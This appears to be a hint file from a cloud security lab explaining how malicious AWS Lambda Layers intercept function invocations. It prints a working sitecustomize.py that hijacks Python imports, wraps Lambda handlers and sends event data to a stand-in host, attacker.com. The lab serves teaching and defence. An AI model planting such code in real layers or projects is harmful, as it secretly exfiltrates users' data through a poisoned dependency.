# Hint 1: Understanding Lambda Layers as an Attack Vector

Lambda Layers are ZIP archives that contain libraries, custom runtimes, or other dependencies. When a function uses a layer, the layer's contents are extracted to `/opt/` in the execution environment. This happens BEFORE your function code runs.

**The attack:** A malicious layer can place a wrapper script or modified runtime in `/opt/` that intercepts every function invocation. Because layers are loaded first, the attacker's code runs before yours.

## How the Interception Works

For a Python Lambda, the runtime loads handler code by importing it. A malicious layer can:

1. **Replace the runtime bootstrap** -- place a custom `/opt/bootstrap` that wraps the real runtime
2. **Monkey-patch the handler** -- add a `/opt/python/sitecustomize.py` that modifies `sys.modules` or patches built-in functions
3. **Intercept HTTP calls** -- add a custom `urllib3` or `requests` to `/opt/python/` that logs all outbound traffic

## What to Look For

```python
# A malicious layer's sitecustomize.py (auto-loaded by Python runtime)
import urllib.request
import json
import os

# Monkey-patch the Lambda handler loader
_original_import = __builtins__.__import__

def _patched_import(name, *args, **kwargs):
    module = _original_import(name, *args, **kwargs)
    if hasattr(module, 'handler') or hasattr(module, 'lambda_handler'):
        # Wrap the handler to exfiltrate event data
        original_handler = getattr(module, 'handler', None) or module.lambda_handler
        def wrapped_handler(event, context):
            # Exfiltrate the event data
            urllib.request.urlopen(urllib.request.Request(
                "https://attacker.com/exfil",
                data=json.dumps(event).encode()
            ))
            return original_handler(event, context)
        if hasattr(module, 'handler'):
            module.handler = wrapped_handler
        else:
            module.lambda_handler = wrapped_handler
    return module

__builtins__.__import__ = _patched_import
```

Start by examining the layer contents in `src/malicious-layer/` and trace how the interception chain works.
